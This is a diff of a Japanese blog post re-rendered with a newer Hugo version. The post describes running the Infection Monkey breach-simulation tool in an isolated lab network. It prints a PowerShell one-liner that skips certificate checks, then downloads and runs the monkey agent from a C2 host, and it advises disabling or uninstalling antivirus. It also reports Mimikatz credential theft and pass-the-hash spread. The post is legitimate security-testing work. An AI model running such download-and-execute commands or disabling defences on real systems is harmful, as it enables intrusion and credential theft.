@@ -5,17 +5,15 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.40.1 with theme Tranquilpeak 0.4.3-SNAPSHOT">
+<meta name="generator" content="Hugo 0.91.2 with theme Tranquilpeak 0.4.3-SNAPSHOT">
 <meta name="author" content="tatsui">
 <meta name="keywords" content="">
 <meta name="description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-">
+Infection Monkeyを動かしてみました。">
 
 
 <meta property="og:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-">
+Infection Monkeyを動かしてみました。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="クラウド環境で使えるペネトレーションテストツール">
 <meta name="twitter:title" content="クラウド環境で使えるペネトレーションテストツール">
@@ -23,11 +21,9 @@ Infection Monkeyを動かしてみました。
 <meta property="twitter:url" content="https://tatsui-techblog.com/2019/05/infectionmonkey/">
 <meta property="og:site_name" content="なないろテクノロジー">
 <meta property="og:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-">
+Infection Monkeyを動かしてみました。">
 <meta name="twitter:description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-">
+Infection Monkeyを動かしてみました。">
 <meta property="og:locale" content="ja">
 
   
@@ -97,16 +93,18 @@ Infection Monkeyを動かしてみました。
 
     
       
-<script>
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-ga('create', 'UA-139884711-1', 'auto');
-ga('send', 'pageview');
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-139884711-1', 'auto');
+	
+	ga('send', 'pageview');
+}
 </script>
-
     
     
 
@@ -287,118 +285,81 @@ ga('send', 'pageview');
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
               <p>プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-</p>
-
+Infection Monkeyを動かしてみました。</p>
 <h2 id="あらかじめ準備しておく環境">あらかじめ準備しておく環境</h2>
-
 <ul>
 <li>被害者用のWindows7以上の VM
-
 <ul>
 <li>VMWareESxi6.5の上に構築</li>
 <li>Windows Defenderとファイアーウォールを無効化</li>
-</ul></li>
+</ul>
+</li>
 <li>感染が拡大しても問題がないネットワーク
-
 <ul>
 <li>ルータでセグメントを分離</li>
 <li>ルータ自体のパスワードを強固に設定</li>
-</ul></li>
+</ul>
+</li>
 <li>DockerがインストールされたLinuxマシン
-
 <ul>
 <li>Ubuntu 18.04に構築</li>
 <li>docker version 18.09.6</li>
 <li>docker-compose version 1.17.1</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h2 id="infection-monkeyのセットアップ">infection monkeyのセットアップ</h2>
-
-<pre><code class="language-bash">$ git clone https://github.com/guardicore/monkey
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/guardicore/monkey
 $ monkey/docker
 $ docker-compose build
 $ docker-compose up -d
-</code></pre>
-
-<p>Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
+</code></pre></div><p>Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
 <a href="https://localhost:5000/">https://localhost:5000/</a></p>
-
-<p><img src="https://i.imgur.com/HH720sZ.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/HH720sZ.png" alt=""></p>
 <h2 id="動作検証">動作検証</h2>
-
 <p>検証を始める前に、VMのスナップショットを取得します。
 スナップショットを取得することで、VMが感染してもすぐに元の状態に戻すことができます。</p>
-
 <p>Infection Moncky管理画面の左側にある<code>2. Run Monkey</code>をクリックしたあと<code>Run on machine of your choice</code>をクリックすると
 powershellコマンドのワンライナーが表示されます</p>
-
-<p><img src="https://i.imgur.com/dZ3Yb16.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/dZ3Yb16.png" alt=""></p>
 <p>malware.batという名前で上記で表示された文字列を貼り付けます。
 私の環境では接続先が<code>172.22.0.3</code>となっていましたが、dockerを実行しているマシンのIPアドレスが<code>192.168.11.251</code>であったので、バッチファイルを少し変更しました。</p>
-
-<pre><code>powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe','.\monkey.exe'); ;Start-Process -FilePath '.\monkey.exe' -ArgumentList 'm0nk3y -s 192.168.11.251:5000';
-</code></pre>
-
-<p>バッチファイルは<code>管理者権限</code>で実行します。
-<img src="https://i.imgur.com/gRU7RoS.png" alt="" /></p>
-
+<pre tabindex="0"><code>powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe','.\monkey.exe'); ;Start-Process -FilePath '.\monkey.exe' -ArgumentList 'm0nk3y -s 192.168.11.251:5000';
+</code></pre><p>バッチファイルは<code>管理者権限</code>で実行します。
+<img src="https://i.imgur.com/gRU7RoS.png" alt=""></p>
 <p>実行するとコマンドプロンプトが起動し、メッセージがたくさん表示されます。
 この時点でウイルスを検知される場合はアンチウイルスを無効化し再度実行します。</p>
-
-<p><code>
-環境によってはアンチウイルスをアンインストールする必要があります。
-</code></p>
-
-<p><img src="https://i.imgur.com/QQMKovj.png" alt="" /></p>
-
+<p><code>環境によってはアンチウイルスをアンインストールする必要があります。</code></p>
+<p><img src="https://i.imgur.com/QQMKovj.png" alt=""></p>
 <p>Infection Monkeyの管理画面のInfectionMapを見ると、感染したWindowsマシンが描画されます。
 MonkeyIslandはC2サーバです。MonkeyIslandから灰色の線で結ばれているマシンはC2サーバから遠隔操作されています。</p>
-
-<p><img src="https://i.imgur.com/EpqFdmX.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/EpqFdmX.png" alt=""></p>
 <p>しばらく待っているとWindowsサーバにも感染を広げてきました。
 Mimikatzを使って認証情報を奪われ、Pass the Hash攻撃をされたようです。
-<img src="https://i.imgur.com/Q8pxKFX.png" alt="" /></p>
-
+<img src="https://i.imgur.com/Q8pxKFX.png" alt=""></p>
 <p>さらに放置するとスキャンを繰り返し侵入を拡大しようとしていきます。
-<img src="https://i.imgur.com/HpNOMZ1.png" alt="" /></p>
-
+<img src="https://i.imgur.com/HpNOMZ1.png" alt=""></p>
 <p>その後30分ぐらい放置すると、WindowsだけでなくLinuxにまで侵入されました。
 侵入されたマシンにはsshがインストールされており、ユーザ名が<code>user</code> パスワードが<code>password</code>となっていました。
-<img src="https://i.imgur.com/HNLX2fD.png" alt="" /></p>
-
+<img src="https://i.imgur.com/HNLX2fD.png" alt=""></p>
 <p>侵入されたホストのプロセスを確認するとmonkeyというプロセスが動いていることが確認できます。</p>
-
 <h4 id="windowsの場合">Windowsの場合</h4>
-
-<p><img src="https://i.imgur.com/RtMEubB.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/RtMEubB.png" alt=""></p>
 <h4 id="linuxの場合">Linuxの場合</h4>
-
-<p><img src="https://i.imgur.com/qtRHQbN.png" alt="" /></p>
-
+<p><img src="https://i.imgur.com/qtRHQbN.png" alt=""></p>
 <h2 id="レポート出力">レポート出力</h2>
-
 <p>4 Security Reportをクリックすると
 シュミレーションの結果を評価したレポートが出力されます
-<img src="https://i.imgur.com/cXDNudh.png" alt="" /></p>
-
+<img src="https://i.imgur.com/cXDNudh.png" alt=""></p>
 <p>ネットワーク図の表示は見辛いですね。。。
-<img src="https://i.imgur.com/ntpTJb2.png" alt="" /></p>
-
+<img src="https://i.imgur.com/ntpTJb2.png" alt=""></p>
 <h2 id="最後に">最後に</h2>
-
 <p>MetasploitやNessusのような脆弱性スキャナーに比べると、ラテラルムーブメントのような
 内部偵察、資格奪取、感染拡大まで自動化できるのが本ツールの特徴でした。
 Exploitモジュールは他の脆弱性スキャナに比べると<a href="https://github.com/guardicore/monkey/tree/develop/monkey/infection_monkey/exploit">明らかに少ない</a>ですが、Pythonで書かれているため個人的には拡張性が高いと思っています。</p>
-
 <p>余談ですが、<a href="https://tatsui-techblog.com/2019/05/wazuh/">前回の記事</a>で構築したWazuhのログを見ても、Infection Monckyで攻撃されている間のログはほとんど取れていませんでした。
 EDRのような使い方はまだ期待できないようですね。
-<img src="https://i.imgur.com/yraL2wG.png" alt="" /></p>
+<img src="https://i.imgur.com/yraL2wG.png" alt=""></p>
               
             </div>
           </div>
@@ -494,7 +455,7 @@ EDRのような使い方はまだ期待できないようですね。
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2019 tatsui. All Rights Reserved
+    &copy; 2022 tatsui. All Rights Reserved
   </span>
 </footer>
 
@@ -647,16 +608,12 @@ EDRのような使い方はまだ期待できないようですね。
               <div class="media-content hide-xs font-merryweather"><p>コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
 <code>ディスクフォレンジック</code>と呼びます。
 ディスクフォレンジックは大まかに下記のような手順で行われます</p>
-
 <ol>
 <li>調査対象の選定</li>
 <li>調査媒体の保全</li>
 <li>フォレンジック調査</li>
 </ol>
-
-<p>今回は<a href="https://tatsui-techblog.com/2019/05/infectionmonkey/">前回の記事</a>で作成した感染マシンを使ってフォレンジック調査をやってみたいと思います。</p>
-
-<p></p></div>
+<p>今回は<a href="https://tatsui-techblog.com/2019/05/infectionmonkey/">前回の記事</a>で作成した感染マシンを使ってフォレンジック調査をやってみたいと思います。</p></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -674,8 +631,7 @@ EDRのような使い方はまだ期待できないようですね。
                 </span>
               </span>
               <div class="media-content hide-xs font-merryweather"><p>プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
-Infection Monkeyを動かしてみました。
-</p></div>
+Infection Monkeyを動かしてみました。</p></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -692,8 +648,7 @@ Infection Monkeyを動かしてみました。
                   May 5, 2019
                 </span>
               </span>
-              <div class="media-content hide-xs font-merryweather"><p>Elastic Stackをベースにして作られたEndpoint Detection and Response (EDR)であるWazuhを構築してみました。
-</p></div>
+              <div class="media-content hide-xs font-merryweather"><p>Elastic Stackをベースにして作られたEndpoint Detection and Response (EDR)であるWazuhを構築してみました。</p></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -713,16 +668,12 @@ Infection Monkeyを動かしてみました。
               <div class="media-content hide-xs font-merryweather"><p>コンピュータフォレンジックの中でHDDやSSDなどのディスクに対するフォレンジックを
 <code>ディスクフォレンジック</code>と呼びます。
 ディスクフォレンジックは大まかに下記のような手順で行われます</p>
-
 <ol>
 <li>調査対象の選定</li>
 <li>調査媒体の保全</li>
 <li>フォレンジック調査</li>
 </ol>
-
-<p>今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。</p>
-
-<p></p></div>
+<p>今回は既に調査対象が選定されているという前提で、調査媒体の保全作業を行ってみたいと思います。</p></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -739,9 +690,7 @@ Infection Monkeyを動かしてみました。
                   May 5, 2019
                 </span>
               </span>
-              <div class="media-content hide-xs font-merryweather"><p>Elasticsearch 7.0がリリースされたそうなので早速Dockerで動かしてみました。</p>
-
-<p></p></div>
+              <div class="media-content hide-xs font-merryweather"><p>Elasticsearch 7.0がリリースされたそうなので早速Dockerで動かしてみました。</p></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -759,14 +708,11 @@ Infection Monkeyを動かしてみました。
                 </span>
               </span>
               <div class="media-content hide-xs font-merryweather"><p>本記事では下記のテーマについて解説したいと思います。</p>
-
 <ul>
 <li>elasticsearchとkibanaの構築</li>
 <li>winlogbeatのインストール</li>
 <li>kibanaダッシュボードの作成</li>
-</ul>
-
-<p></p></div>
+</ul></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
@@ -785,18 +731,14 @@ Infection Monkeyを動かしてみました。
               </span>
               <div class="media-content hide-xs font-merryweather"><p>本サイトはMarkdownで記事を書いた後に<a href="https://gohugo.io/">Hugo</a>でHTMLを生成し、Github Pagesデプロイしています。
 テーマは<a href="https://github.com/kakawait/hugo-tranquilpeak-theme">Tranquilpeak</a>を使用しています。</p>
-
 <p>他にもブログを公開するために下記のサービスを利用しています。</p>
-
 <ul>
 <li><a href="https://github.com/tatsu-i/tatsu-i.github.io">https://github.com/tatsu-i/tatsu-i.github.io</a> (Github Pages)</li>
 <li><a href="https://github.com/tatsu-i/blog">https://github.com/tatsu-i/blog</a> (privateリポジトリ)</li>
 <li><a href="https://circleci.com/">https://circleci.com/</a> (CI/CD)</li>
 <li><a href="https://www.onamae.com">https://www.onamae.com</a> (CNAMEでgithub pagesのドメインを変更)</li>
 <li><a href="https://hackmd.io">https://hackmd.io</a> (記事の下書き用)</li>
-</ul>
-
-<p></p></div>
+</ul></div>
             </div>
             <div style="clear:both;"></div>
             <hr>
